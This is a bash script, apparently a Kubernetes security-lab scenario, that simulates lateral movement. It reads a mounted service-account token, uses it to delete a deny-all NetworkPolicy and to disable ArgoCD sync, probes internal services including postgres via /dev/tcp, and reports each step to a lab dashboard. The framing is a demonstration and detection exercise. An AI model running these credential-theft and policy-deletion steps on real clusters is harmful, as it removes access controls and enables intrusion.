#!/bin/bash
# =============================================================================
# Scenario 2 — Lateral Movement via NetworkPolicy Bypass
# attack.sh — steals network-tooling-sa token, deletes NetworkPolicy
#
# Unlike Scenario 1:
#   - Uses narrowly scoped SA (NetworkPolicy admin only)
#   - Cannot suspend ArgoCD — no rights to argocd namespace
#   - Attack window is bounded by ArgoCD reconciliation (~30 seconds)
#   - Backend deletes Kyverno protect-networkpolicies policy first
# =============================================================================

set -euo pipefail

BACKEND_URL="${BACKEND_URL:-http://secops-backend:3000}"
NAMESPACE="${NAMESPACE:-secops-lab}"

emit() {
  local phase=$1 severity=$2 title=$3 explanation=$4
  curl -sf -X POST "$BACKEND_URL/internal" \
    -H "Content-Type: application/json" \
    -d "{\"phase\":\"$phase\",\"severity\":\"$severity\",\"title\":\"$title\",\"explanation\":\"$explanation\"}" \
    || true
}

APISERVER="https://kubernetes.default.svc"
CA="/var/run/secrets/kubernetes.io/serviceaccount/ca.crt"

# ── Step 1: Read network-tooling-sa token ─────────────────────────────────────
emit "ATTACK" "WARNING" \
  "Pod reading network-tooling-sa token" \
  "Token readable at default mount path. Has NetworkPolicy admin rights — not cluster-admin, but enough to cause lateral movement."

TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null || echo "")

if [ -z "$TOKEN" ]; then
  emit "DETECT" "SUCCESS" \
    "No token found — mount disabled" \
    "automountServiceAccountToken is false. Attack cannot proceed."
  exit 0
fi

# ── Step 2: Attempt to delete NetworkPolicy ───────────────────────────────────
emit "ATTACK" "WARNING" \
  "Attempting to delete NetworkPolicy: deny-all" \
  "Using stolen token to delete the namespace deny-all NetworkPolicy. This is the only thing this token can do — narrowly scoped but still dangerous."

DELETE_RESULT=$(kubectl delete networkpolicy deny-all \
  --token="$TOKEN" \
  --server="$APISERVER" \
  --certificate-authority="$CA" \
  -n "$NAMESPACE" \
  2>&1 || echo "BLOCKED")

if echo "$DELETE_RESULT" | grep -q "BLOCKED\|denied\|forbidden"; then
  emit "DETECT" "SUCCESS" \
    "Kyverno: NetworkPolicy deletion blocked" \
    "Kyverno policy protect-networkpolicies denied the delete request at admission. NetworkPolicy never deleted. Lateral movement window: 0 seconds."
  exit 0
fi

# ── Step 3: Try to suspend ArgoCD (will fail — no rights) ────────────────────
emit "ATTACK" "CRITICAL" \
  "Attempting to suspend ArgoCD sync" \
  "Pod tries to suspend ArgoCD using network-tooling-sa token. Access denied — SA has no rights to argocd namespace. ArgoCD keeps running."

kubectl patch application secops-lab \
  --token="$TOKEN" \
  --server="$APISERVER" \
  --certificate-authority="$CA" \
  -n argocd \
  --type merge \
  -p '{"spec":{"syncPolicy":{"automated":null}}}' \
  2>&1 || emit "DETECT" "WARNING" \
    "ArgoCD suspend failed — insufficient permissions" \
    "network-tooling-sa has no rights to the argocd namespace. ArgoCD will reconcile in ~30 seconds. The attack window is bounded."

# ── Step 4: Record window open time ──────────────────────────────────────────
WINDOW_START=$(date +%s)

curl -sf -X POST "$BACKEND_URL/internal/window-start" \
  -H "Content-Type: application/json" \
  -d "{\"scenario\":\"network-policy-bypass\",\"started_at\":$WINDOW_START}" \
  || true

emit "IMPACT" "CRITICAL" \
  "Lateral movement window open — racing ArgoCD" \
  "All pods in namespace can reach each other. Attacker is racing ArgoCD's reconciliation clock. Unlike Scenario 1 there is no way to extend this window."

# ── Step 5: Probe internal services during window ────────────────────────────
emit "IMPACT" "WARNING" \
  "Probing internal services during window" \
  "Attacker scanning previously blocked internal endpoints. Window is closing — every second counts."

PROBE_RESULTS=""

# Probe backend — use /health (public endpoint) to confirm network reachability
BACKEND_RESULT=$(curl -sf --max-time 3 http://secops-backend:3000/health 2>&1 && echo "200 OK" || echo "blocked")
PROBE_RESULTS="backend:3000/admin -> $BACKEND_RESULT\n"

# Probe postgres (bash /dev/tcp — nc not available in image)
POSTGRES_RESULT=$(bash -c 'echo > /dev/tcp/postgres/5432' 2>/dev/null && echo "open" || echo "blocked")
PROBE_RESULTS="${PROBE_RESULTS}postgres:5432 -> $POSTGRES_RESULT\n"

# Probe ArgoCD server
ARGOCD_RESULT=$(curl -sf --max-time 3 http://argocd-server.argocd.svc.cluster.local:80 2>&1 && echo "200 OK" || echo "blocked")
PROBE_RESULTS="${PROBE_RESULTS}argocd-server:80 -> $ARGOCD_RESULT\n"

# Send probe results to backend
curl -sf -X POST "$BACKEND_URL/internal/probe-results" \
  -H "Content-Type: application/json" \
  -d "{\"scenario\":\"network-policy-bypass\",\"results\":$(echo -e "$PROBE_RESULTS" | jq -Rs .)}" \
  || true

echo "Attack complete — ArgoCD will reconcile in ~30 seconds"
